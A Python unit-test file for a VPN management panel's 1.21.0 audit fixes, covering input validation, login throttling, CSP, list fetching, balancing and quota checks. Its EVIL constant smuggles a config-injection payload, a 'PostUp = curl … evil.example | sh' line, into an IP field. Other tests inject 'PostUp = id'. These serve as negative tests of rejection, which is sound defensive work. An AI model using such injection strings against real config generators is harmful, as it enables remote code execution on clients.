"""1.21.0, исправления по отчёту проверки 2026-11-16: проверка входящих данных, мелкие ошибки
(этап 1), интерфейс (этап 2), движок (этап 3), сеть и безопасность (этап 4).

python3 -m unittest discover tests
"""
import json
import os
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

os.environ.setdefault("DATA_DIR", tempfile.mkdtemp())
os.environ.setdefault("DRY_RUN", "1")
os.environ.setdefault("PANEL_PASSWORD", "test-password")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app import awgserver, balance, domains, engine, limits, lists, main, notify, probe, socks, store, tgbot, tgreq  # noqa: E402,E501
from app.web import HTTPError  # noqa: E402


class Req:
    def __init__(self, body, ip="203.0.113.77"):
        self.body = body
        self.client_ip = ip
        self.headers = {}
        self.set_cookies = []

    def json(self):
        return self.body

    def cookie(self, *a, **kw):
        pass


def code(fn):
    try:
        fn()
    except HTTPError as e:
        return e.code, getattr(e.detail, "key", None)
    return 200, None


# ============================================================ этап 1: внешний адрес и конфиги (Б 1)
EVIL = "198.51.100.7\n[Interface]\nPostUp = curl -s http://evil.example/x | sh #"


class ProbeIpTest(unittest.TestCase):
    def test_ip_of(self):
        self.assertEqual(probe.ip_of(" 203.0.113.5\n"), "203.0.113.5")
        self.assertEqual(probe.ip_of("2001:db8::1"), "2001:db8::1")
        for bad in (EVIL, "", None, "example.com", "1.2.3.4 5.6.7.8"):
            with self.assertRaises(ValueError):
                probe.ip_of(bad)

    def test_whoami_rejects_spoofed_answers(self):
        """1.1.1.1 молчит, а ответы по HTTP подменены: адреса нет, а не строка с PostUp."""
        def get(host, path, tls=False):
            if host == "1.1.1.1":
                raise OSError("timed out")
            if host == "ip-api.com":
                return json.dumps({"status": "success", "query": EVIL, "countryCode": "XXX"})
            return EVIL
        with mock.patch.object(probe, "http_get", get):
            with self.assertRaises(OSError):
                probe.whoami()

    def test_ifconfig_over_https(self):
        seen = []

        def get(host, path, tls=False):
            seen.append((host, tls))
            if host != "ifconfig.me":
                raise OSError("down")
            return "203.0.113.9\n"
        with mock.patch.object(probe, "http_get", get):
            self.assertEqual(probe.whoami(), {"ip": "203.0.113.9"})
        self.assertIn(("ifconfig.me", True), seen)


class DetectHostTest(unittest.TestCase):
    def run_detect(self, answer):
        d = tempfile.mkdtemp()
        e = engine.Engine(store.Store(os.path.join(d, "state.json")))
        e.target = e._fake
        e.probe = lambda out: answer
        th = threading.Thread(target=e._detect_host, daemon=True)
        th.start()
        time.sleep(0.3)
        e.stop_ev.set()
        th.join(5)
        return e, e.store.snapshot()["settings"]

    def test_spoofed_answer_is_not_saved(self):
        with mock.patch.object(engine.config, "PUBLIC_HOST", ""):
            e, s = self.run_detect({"ok": True, "ip": EVIL})
        self.assertNotIn("public_host", s)
        self.assertIsNone(e.public_v4)

    def test_good_answer_is_saved(self):
        with mock.patch.object(engine.config, "PUBLIC_HOST", ""):
            e, s = self.run_detect({"ok": True, "ip": "203.0.113.44"})
        self.assertEqual(s.get("public_host"), "203.0.113.44")
        self.assertEqual(e.public_v4, "203.0.113.44")

    def test_ipv6_is_not_a_public_v4(self):
        with mock.patch.object(engine.config, "PUBLIC_HOST", ""):
            e, s = self.run_detect({"ok": True, "ip": "2001:db8::5"})
        self.assertNotIn("public_host", s)


class ClientConfOneLineTest(unittest.TestCase):
    KEY = "A" * 43 + "="

    def parts(self, host="203.0.113.5", dns=("1.1.1.1",), keepalive="25"):
        sc = awgserver.new_server(self.KEY, 51820, "10.8.1.0/24", {"Jc": "4"})
        prof = awgserver.ClientProfile(host=host, port=51820, server_pub=self.KEY, dns=list(dns),
                                       keepalive=keepalive)
        return sc, prof, awgserver.Peer(self.KEY, "", "10.8.1.2/32")

    def test_normal_config(self):
        sc, prof, peer = self.parts()
        conf = awgserver.client_conf(sc, prof, peer, self.KEY)
        self.assertIn("Endpoint = 203.0.113.5:51820", conf)

    def test_newline_in_host(self):
        sc, prof, peer = self.parts(host=EVIL)
        for fn in (lambda: awgserver.client_conf(sc, prof, peer, self.KEY),
                   lambda: awgserver.vpn_link(sc, prof, peer, self.KEY, "", "x")):
            with self.assertRaises(awgserver.ServerConfError) as cm:
                fn()
            self.assertEqual(cm.exception.msg.key, "srv.bad_host")

    def test_newline_elsewhere(self):
        sc, prof, peer = self.parts(keepalive="25\nPostUp = id")
        with self.assertRaises(awgserver.ServerConfError):
            awgserver.client_conf(sc, prof, peer, self.KEY)
        sc, prof, peer = self.parts()
        with self.assertRaises(awgserver.ServerConfError):
            awgserver.client_conf(sc, prof, peer, self.KEY, {"I1": "<b 0x00>\nPostUp = id"})


# ============================================================ этап 1: проверка ввода (Б 16, 17, 18)
class InputTypesTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        main.engine.reconcile()

    def test_server_params_not_object(self):
        for v in ("x", ["Jc"], 5, True):
            self.assertEqual(code(lambda: main.put_server(Req({"params": v}))), (400, "err.bad_value"), v)

    def test_rule_enabled_string(self):
        st = main.store.snapshot()
        for v in ("false", "no", 0, 1):
            self.assertEqual(code(lambda: main.v_rules(st, [{"lists": ["ru"], "outbound": "direct",
                                                              "enabled": v}])), (400, "err.bad_value"), v)
        r = main.v_rules(st, [{"lists": ["ru"], "outbound": "direct"}])
        self.assertIs(r[0]["enabled"], True)
        r = main.v_rules(st, [{"lists": ["ru"], "outbound": "direct", "enabled": False}])
        self.assertIs(r[0]["enabled"], False)

    def test_list_update_hours_bool(self):
        self.assertEqual(code(lambda: main.put_settings(Req({"list_update_hours": True}))), (400, "err.hours"))

    def test_restore_flags(self):
        g = main.clean_backup_state(main.store.snapshot())
        g["settings"]["telegram"] = {"token": "123456:" + "A" * 35, "chat_id": "424242",
                                     "enabled": "false", "control": "no"}
        c = main.clean_backup_state(g)["settings"]["telegram"]
        self.assertFalse(c["enabled"])
        self.assertFalse(c["control"])
        g["upstreams"] = [{"id": "uflag", "num": 7, "name": "x", "enabled": "false",
                           "config": "socks5://198.51.100.9:1080"}]
        self.assertEqual(code(lambda: main.clean_backup_state(g)), (400, "err.backup_field"))


class StaticNulTest(unittest.TestCase):
    def test_nul_is_404(self):
        import http.client
        srv = main.app.serve("127.0.0.1", 0)
        th = threading.Thread(target=srv.serve_forever, daemon=True)
        th.start()
        try:
            for path in ("/static/%00", "/static/app.js%00.png", "/s/assets/%00"):
                c = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=5)
                c.request("GET", main.BASE + path if path.startswith("/static") else path)
                self.assertEqual(c.getresponse().status, 404, path)
                c.close()
        finally:
            srv.shutdown()
            srv.server_close()


# ============================================================ этап 1: хранение и мелочи (Б 19, 22, 25, 27, 30)
class StoreWriteFirstTest(unittest.TestCase):
    def test_failed_write_keeps_old_state(self):
        d = tempfile.mkdtemp()
        s = store.Store(os.path.join(d, "state.json"))
        before = s.snapshot()
        with mock.patch.object(s, "_write", side_effect=OSError(28, "No space left on device")):
            with self.assertRaises(OSError):
                s.mutate(lambda st: st["settings"].__setitem__("list_update_hours", 5))
        self.assertEqual(s.snapshot(), before)          # не записали — и не применили
        s.mutate(lambda st: st["settings"].__setitem__("list_update_hours", 6))
        with open(os.path.join(d, "state.json")) as f:
            self.assertEqual(json.load(f)["settings"]["list_update_hours"], 6)


class LoginAttemptsTest(unittest.TestCase):
    def setUp(self):
        main._fails.clear()
        main._inflight.clear()

    def test_parallel_attempts_count(self):
        """24 соединения с одного адреса не проверят 24 пароля разом: идущие проверки тоже считаются."""
        started = []
        for _ in range(main.FAIL_MAX):
            main._check_blocked("198.51.100.1")
            started.append(1)
        self.assertEqual(code(lambda: main._check_blocked("198.51.100.1")), (429, "err.too_many_attempts"))
        for _ in started:
            main._done("198.51.100.1")
        main._check_blocked("198.51.100.1")         # закончились — снова можно
        main._done("198.51.100.1")

    def test_old_addresses_forgotten(self):
        main._fails["198.51.100.2"] = [time.time() - main.FAIL_WINDOW - 5]
        main._check_blocked("198.51.100.3")
        main._done("198.51.100.3")
        self.assertNotIn("198.51.100.2", main._fails)

    def test_wrong_password_still_blocks(self):
        with mock.patch.object(main.time, "sleep"):
            for _ in range(main.FAIL_MAX):
                self.assertEqual(code(lambda: main.login(Req({"password": "nope"}, "198.51.100.4"))),
                                 (403, "err.wrong_password"))
        self.assertEqual(code(lambda: main.login(Req({"password": "nope"}, "198.51.100.4"))),
                         (429, "err.too_many_attempts"))
        self.assertEqual(main._inflight, {})


class BotTextTest(unittest.TestCase):
    def test_braces_in_name(self):
        key = next(k for k, v in tgbot.TEXTS["en"].items() if "{name}" in v and "{gb}" in v)
        out = tgbot.tr("en", key, name="{gb}", gb=15)
        self.assertIn("{gb}", out)


class ListWriteTest(unittest.TestCase):
    def test_parallel_writes_leave_whole_file(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "x.txt")
        texts = ["".join(f"{i}.{j}.0.0/16\n" for j in range(200)) for i in range(1, 9)]
        ths = [threading.Thread(target=domains.write_atomic, args=(p, t)) for t in texts]
        for th in ths:
            th.start()
        for th in ths:
            th.join()
        with open(p) as f:
            self.assertIn(f.read(), texts)
        self.assertEqual([x for x in os.listdir(d) if x.endswith(".tmp")], [])

    def test_refresh_one_at_a_time(self):
        inside, most = [0], [0]

        def slow(lst, stats=None):
            inside[0] += 1
            most[0] = max(most[0], inside[0])
            time.sleep(0.05)
            inside[0] -= 1
            return []
        with mock.patch.object(lists, "fetch_list", slow):
            ths = [threading.Thread(target=lists.refresh, args=({"id": "lpar", "kind": "manual", "source": ""},))
                   for _ in range(4)]
            for th in ths:
                th.start()
            for th in ths:
                th.join()
        self.assertEqual(most[0], 1)


class HelperLogTrimTest(unittest.TestCase):
    def test_trim(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "sniproxy.log")
        with open(p, "wb") as f:
            for i in range(200000):
                f.write(f"2026-11-16 line {i:06d} {'x' * 20}\n".encode())
        engine._trim_log(p)
        self.assertLessEqual(os.path.getsize(p), engine.LOG_KEEP)
        with open(p, "rb") as f:
            data = f.read()
        self.assertTrue(data.startswith(b"2026-11-16 line "))          # с начала строки
        self.assertTrue(data.rstrip().endswith(b"line 199999 " + b"x" * 20))
        small = os.path.join(d, "dnsproxy.log")
        with open(small, "w") as f:
            f.write("ok\n")
        engine._trim_log(small)
        with open(small) as f:
            self.assertEqual(f.read(), "ok\n")


# ============================================================ этап 2: интерфейс (Б 10, 12, 13, 14)
class CspTest(unittest.TestCase):
    def test_header_on_pages_only(self):
        import http.client
        srv = main.app.serve("127.0.0.1", 0)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            c = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=5)
            c.request("GET", main.BASE + "/")
            r = c.getresponse()
            r.read()
            csp = r.getheader("Content-Security-Policy") or ""
            self.assertIn("script-src 'self'", csp)
            self.assertIn("frame-ancestors 'none'", csp)
            self.assertNotIn("unsafe-eval", csp)
            c.request("GET", main.BASE + "/api/state")
            r = c.getresponse()
            r.read()
            self.assertIsNone(r.getheader("Content-Security-Policy"))
            c.close()
        finally:
            srv.shutdown()
            srv.server_close()

    def test_no_inline_scripts(self):
        """CSP без 'unsafe-inline' для скриптов: на страницах нет встроенных скриптов и обработчиков."""
        import re
        static = os.path.join(os.path.dirname(__file__), "..", "app", "static")
        for name in ("index.html", "share.html"):
            with open(os.path.join(static, name)) as f:
                html = f.read()
            self.assertFalse(re.search(r"<script(?![^>]*\bsrc=)", html), name)
            self.assertFalse(re.search(r"\son[a-z]+\s*=", html), name)
        for name in ("app.js", "share.js", "i18n.js", "qrcode.js"):
            with open(os.path.join(static, name)) as f:
                js = f.read()
            self.assertNotIn("eval(", js, name)
            self.assertNotIn("new Function", js, name)
            self.assertNotIn("javascript:", js, name)


class ListsInBackgroundTest(unittest.TestCase):
    def test_needs_net(self):
        self.assertTrue(main._needs_net({"kind": "country", "source": "de"}))
        self.assertTrue(main._needs_net({"kind": "url", "source": "https://x.example/l.txt"}))
        self.assertTrue(main._needs_net({"kind": "domains", "source": "youtube.com\nhttps://x.example/d.txt"}))
        self.assertFalse(main._needs_net({"kind": "domains", "source": "youtube.com"}))
        self.assertFalse(main._needs_net({"kind": "manual", "source": "10.0.0.0/8"}))

    def test_add_country_does_not_wait(self):
        gate = threading.Event()

        def slow(lst, stats=None):
            gate.wait(5)
            raise lists.ListError(main.Msg("list.empty"))
        st0 = main.store.snapshot()
        try:
            with mock.patch.object(lists, "fetch_list", slow):
                t0 = time.time()
                r = main.add_list(Req({"kind": "country", "source": "nl"}))
                self.assertLess(time.time() - t0, 1)
                self.assertTrue(r["busy"])
                view = next(x for x in main.get_state(Req({}))["lists"] if x["id"] == "nl")
                self.assertTrue(view["busy"])
                gate.set()
                for _ in range(50):
                    if "nl" not in main.engine.lists_busy:
                        break
                    time.sleep(0.05)
            l = main.Store.lst(main.store.snapshot(), "nl")
            self.assertTrue(l.get("error"))
            self.assertNotIn("nl", main.engine.lists_busy)
        finally:
            main.store.mutate(lambda st: (st.clear(), st.update(st0)))

    def test_manual_still_immediate(self):
        st0 = main.store.snapshot()
        try:
            r = main.add_list(Req({"kind": "manual", "source": "10.0.0.0/8\n1.2.3.0/24", "name": "m"}))
            self.assertFalse(r["busy"])
            self.assertEqual(r["count"], 2)
        finally:
            main.store.mutate(lambda st: (st.clear(), st.update(st0)))


class UiGuardsTest(unittest.TestCase):
    """Б 12, 13 — проверка по тексту app.js (браузерная проверка — Playwright, вне юнит-тестов)."""
    def setUp(self):
        with open(os.path.join(os.path.dirname(__file__), "..", "app", "static", "app.js")) as f:
            self.js = f.read()

    def test_server_tab_leave_guard(self):
        self.assertIn('if (tab === "server" && srvDirty()) return confirm(t("srv.leave"));', self.js)
        self.assertIn('(tab === "server" && srvDirty())', self.js.split('"beforeunload"', 1)[1][:200])

    def test_stale_state_dropped(self):
        self.assertIn("if (seq < stateShown) return;", self.js)


# ============================================================ этап 3: движок
class SocksResolveTimeoutTest(unittest.TestCase):
    """Б4: молчащий DNS не держит проход движка десятки секунд."""

    def test_timeout(self):
        def slow(*a, **kw):
            time.sleep(5)
            raise OSError
        with mock.patch("socket.getaddrinfo", slow):
            t0 = time.time()
            with self.assertRaises(socks.SocksError):
                socks.resolve("proxy.example", timeout=0.3)
            self.assertLess(time.time() - t0, 2)

    def test_ip_and_name(self):
        self.assertEqual(socks.resolve("203.0.113.9"), "203.0.113.9")
        with mock.patch("socket.getaddrinfo", return_value=[(2, 1, 6, "", ("198.51.100.4", 0))]):
            self.assertEqual(socks.resolve("proxy.example", timeout=1), "198.51.100.4")

    def test_prefetch_includes_socks(self):
        with open(os.path.join(os.path.dirname(__file__), "..", "app", "engine.py"), encoding="utf-8") as f:
            src = f.read()
        self.assertIn('pc.socks["host"] if pc.kind == "socks5"', src)


class BalancerSpreadTest(unittest.TestCase):
    """Б3: клиенты упавшего выхода расходятся по выходам, а не уходят все на один."""

    def test_failed_exit_spread(self):
        b = balance.Balancer()
        A, B, C = ({"id": x, "up": None, "down": None} for x in "ABC")
        clients = [f"pk{i:02d}" for i in range(60)]
        b.plan([A, B, C], clients, 1000.0)
        b.exit_rate = {"A": [0, 1_500_000], "B": [0, 1_500_000], "C": [0, 500_000]}
        plan = b.plan([B, C], clients, 1010.0)
        from collections import Counter
        n = Counter(plan.values())
        self.assertEqual(n["B"] + n["C"], 60)
        self.assertGreater(n["B"], 20)          # раньше: все 20 клиентов A — на C (B = 20, C = 40)
        self.assertGreater(n["C"], n["B"])      # C свободнее — ему больше

    def test_known_client_rate(self):
        """Скорость клиента известна — прибавляется она, а не средняя по выходу."""
        b = balance.Balancer()
        A, B, C = ({"id": x, "up": None, "down": None} for x in "ABC")
        b.assign = {"heavy": "A", "x1": "B", "x2": "C"}
        b.client_rate = {("heavy", "A"): [0, 5_000_000]}
        b.exit_rate = {"A": [0, 5_000_000], "B": [0, 100_000], "C": [0, 100_000]}
        b.plan([B, C], ["heavy", "x1", "x2", "new1"], 1000.0)
        self.assertNotEqual(b.assign["new1"], b.assign["heavy"])   # новый — не к тяжёлому

    def test_estimate(self):
        b = balance.Balancer()
        b.client_rate = {("p", "A"): [10, 30_000], ("q", "B"): [0, 50_000]}
        b.exit_rate = {"A": [100, 400_000]}
        self.assertEqual(b._estimate("p", "A", {"A": 4}, [0, 0]), [10, 30_000])
        self.assertEqual(b._estimate("z", "A", {"A": 4}, [0, 0]), [25, 100_000])
        self.assertEqual(b._estimate("z", None, {}, b._typical()), [5.0, 40_000.0])


class LimitsRecheckTest(unittest.TestCase):
    """Б26: срок или лимит изменили во время прохода — клиента не отключают по старым значениям."""

    def _engine(self, L, used, changed):
        class Store:
            def __init__(s):
                s.st = {"limits": {"K": dict(L)}}

            def snapshot(s):
                return json.loads(json.dumps(s.st))

            def peek(s, fn):
                s.st["limits"]["K"].update(changed)       # администратор успел изменить
                return fn(s.st)

            def mutate(s, fn):
                fn(s.st)

        class Eng:
            pass
        e = Eng()
        e.store, e.events = Store(), []
        e.traffic = mock.Mock(used=lambda pk, period: used)
        e.clients = [{"public_key": "K", "name": "n", "enabled": True}]
        e.srv = mock.Mock()
        e.event = lambda lvl, m: e.events.append(m.key)
        return e

    def test_extended_expiry(self):
        e = self._engine({"expires": 1000}, 0, {"expires": 10 ** 9})
        limits.enforce(e, now=2000)
        e.srv.update_client.assert_not_called()
        self.assertNotIn("exp_done", e.store.st["limits"]["K"])

    def test_raised_quota(self):
        e = self._engine({"quota": 100, "period": "month"}, 150, {"quota": 10 ** 6})
        limits.enforce(e, now=2000)
        e.srv.update_client.assert_not_called()
        self.assertNotIn("quota_done", e.store.st["limits"]["K"])

    def test_extended_right_after_disable(self):
        """Продлили сразу после отключения: пометка остаётся, следующий проход включает клиента."""
        e = self._engine({"expires": 1000}, 0, {})
        e.srv.update_client.side_effect = lambda pk, enabled=None: (
            e.clients[0].update(enabled=enabled), e.store.st["limits"]["K"].update(expires=10 ** 9))
        limits.enforce(e, now=2000)
        self.assertFalse(e.clients[0]["enabled"])
        self.assertEqual(e.store.st["limits"]["K"]["auto_off"], "exp")
        self.assertNotIn("exp_done", e.store.st["limits"]["K"])
        limits.enforce(e, now=2100)
        self.assertTrue(e.clients[0]["enabled"])
        self.assertIsNone(e.store.st["limits"]["K"]["auto_off"])

    def test_unchanged_still_disables(self):
        e = self._engine({"quota": 100, "period": "month"}, 150, {})
        limits.enforce(e, now=2000)
        e.srv.update_client.assert_called_once()
        self.assertTrue(e.store.st["limits"]["K"]["quota_done"])


class ListFetchTest(unittest.TestCase):
    """Б20: обрыв и слишком большой ответ; Б7: скачивание через выход."""

    def test_whole_lines(self):
        self.assertEqual(lists.whole_lines("1.0.0.0/24\n185.10.0.0/1", False), "1.0.0.0/24\n")
        self.assertEqual(lists.whole_lines("1.0.0.0/24\n185.10.0.0/16", True), "1.0.0.0/24\n185.10.0.0/16")
        self.assertEqual(lists.whole_lines("1.0.0.0/24\n", False), "1.0.0.0/24\n")

    def test_wide_prefix_dropped(self):
        nets = lists.parse_cidrs("185.10.0.0/1\n5.0.0.0/8\n", lists.WIDE_MIN)
        self.assertEqual([str(n) for n in nets], ["5.0.0.0/8"])
        self.assertEqual(len(lists.parse_cidrs("128.0.0.0/1\n")), 1)    # ручной список — как есть

    def _resp(self, data, headers):
        r = mock.MagicMock()
        r.status = 200
        r.read = lambda n=-1: data[:n] if n >= 0 else data
        r.headers = headers
        r.__enter__ = lambda s: r
        r.__exit__ = lambda s, *a: False
        return r

    def test_unframed_tail_dropped(self):
        with mock.patch("urllib.request.urlopen", return_value=self._resp(b"1.0.0.0/24\n185.10.0.0/1", {})):
            self.assertEqual(lists._fetch("https://x.example/l"), "1.0.0.0/24\n")

    def test_too_large(self):
        with mock.patch.object(lists, "FETCH_MAX", 10), \
                mock.patch("urllib.request.urlopen", return_value=self._resp(b"x" * 20, {"Content-Length": "20"})):
            with self.assertRaises(RuntimeError):
                lists._fetch_direct("https://x.example/l")

    def test_via_exit(self):
        with mock.patch.object(lists, "_fetch_direct", side_effect=OSError("blocked")), \
                mock.patch.object(lists, "alt_fetch", lambda url: ("2.0.0.0/16\n5.5.0.0/1", False)):
            self.assertEqual(lists._fetch("https://raw.example/l"), "2.0.0.0/16\n")
        with mock.patch.object(lists, "_fetch_direct", return_value=('{"data": 1}', False)):
            self.assertEqual(lists._fetch("https://stat.example/j", lines=False), '{"data": 1}')
        with mock.patch.object(lists, "_fetch_direct", side_effect=OSError("blocked")), \
                mock.patch.object(lists, "alt_fetch", mock.Mock(side_effect=OSError("down"))):
            with self.assertRaisesRegex(RuntimeError, "blocked; via exit: down"):
                lists._fetch("https://raw.example/l")
        with mock.patch.object(lists, "_fetch_direct", side_effect=OSError("blocked")), \
                mock.patch.object(lists, "alt_fetch", None):
            with self.assertRaises(OSError):
                lists._fetch("https://raw.example/l")
        import urllib.error
        alt = mock.Mock()
        with mock.patch.object(lists, "_fetch_direct",
                               side_effect=urllib.error.HTTPError("u", 404, "nf", {}, None)), \
                mock.patch.object(lists, "alt_fetch", alt):
            with self.assertRaises(urllib.error.HTTPError):    # сайт ответил — через выход не пробуем
                lists._fetch("https://raw.example/l")
        alt.assert_not_called()

    def test_main_fetch_via_exit(self):
        with mock.patch.object(main.engine, "alt_routes", return_value=["up:a", "up:b"]), \
                mock.patch.object(main.engine, "own_route", side_effect=[(10, 0x2001), (10, 0x2002)]), \
                mock.patch.object(notify, "get_via", side_effect=[OSError("timed out"),
                                                                  (200, "3.0.0.0/16\n4.0.0.0/1", False)]):
            self.assertEqual(main._fetch_via_exit("https://raw.example/l"), ("3.0.0.0/16\n4.0.0.0/1", False))
        with mock.patch.object(main.engine, "alt_routes", return_value=[]):
            with self.assertRaises(OSError):
                main._fetch_via_exit("https://raw.example/l")


class TgreqGetTest(unittest.TestCase):
    def _run(self, head, ret=None, side=None):
        with mock.patch.object(tgreq, "request", return_value=ret, side_effect=side) as rq, \
                mock.patch("sys.stdin", mock.Mock(buffer=mock.Mock(read=lambda: head + b"\n"))), \
                mock.patch("sys.argv", ["tgreq.py", "8193"]), mock.patch("builtins.print") as pr:
            tgreq.main()
        return rq, json.loads(pr.call_args[0][0])

    def test_get_with_limit(self):
        rq, out = self._run(b'{"url":"https://x.example/l","method":"GET","limit":1000,"timeout":30}',
                            ret=(200, b"1.0.0.0/8\n", "", False))
        self.assertEqual(rq.call_args[0][5:], ("GET", 1000))
        self.assertEqual(out, {"status": 200, "body": "1.0.0.0/8\n", "date": "", "framed": False})

    def test_dns_only(self):
        with mock.patch.object(tgreq, "resolve", return_value=["198.51.100.8"]) as rs:
            _, out = self._run(b'{"dns":"blocked.example"}')
        self.assertEqual(out, {"ips": ["198.51.100.8"]})
        self.assertEqual(rs.call_args, mock.call("blocked.example", 8193, udp=True))

    def test_get_via(self):
        out = json.dumps({"status": 200, "body": "x\n", "framed": True}).encode()
        with mock.patch("subprocess.run", return_value=mock.Mock(stdout=out, stderr=b"")) as run:
            self.assertEqual(notify.get_via((5, 0x2003), "https://x.example/l", 30, 99), (200, "x\n", True))
        head = json.loads(run.call_args.kwargs["input"].split(b"\n")[0])
        self.assertEqual((head["method"], head["limit"]), ("GET", 99))
        self.assertEqual(run.call_args[0][0][:4], ["nsenter", "-t", "5", "-n"])


class TraceDnsViaExitTest(unittest.TestCase):
    """Б15: имя в «Проверке маршрута» разбирается тем путём, которым пойдёт DNS клиента."""

    def test_via_exit(self):
        with mock.patch.object(main.engine, "resolve_name", return_value=("198.51.100.20", "direct")), \
                mock.patch("socket.getaddrinfo") as gai:
            res = main.trace_target(None, "blocked.example")
        gai.assert_not_called()
        self.assertEqual(res["ip"], "198.51.100.20")
        self.assertEqual(res["steps"][0].key, "tr.resolved_via")

    def test_fallback(self):
        with mock.patch.object(main.engine, "resolve_name", side_effect=Exception("demo")), \
                mock.patch("socket.getaddrinfo", return_value=[(2, 1, 6, "", ("198.51.100.21", 0))]):
            res = main.trace_target(None, "blocked.example")
        self.assertEqual(res["steps"][0].key, "tr.resolved")
        self.assertEqual(res["ip"], "198.51.100.21")

    def test_dry_run_has_no_path(self):
        from app import system
        with self.assertRaises(system.SysError):
            main.engine.resolve_name(None, "blocked.example")


class ClientConfigNoLockTest(unittest.TestCase):
    """Выдача конфига не ждёт проход движка (engine.lock)."""

    def test_no_engine_lock(self):
        import inspect
        from app import users
        src = inspect.getsource(users.ServerManager.client_config)
        self.assertNotIn("self.e.lock", src)


if __name__ == "__main__":
    unittest.main()
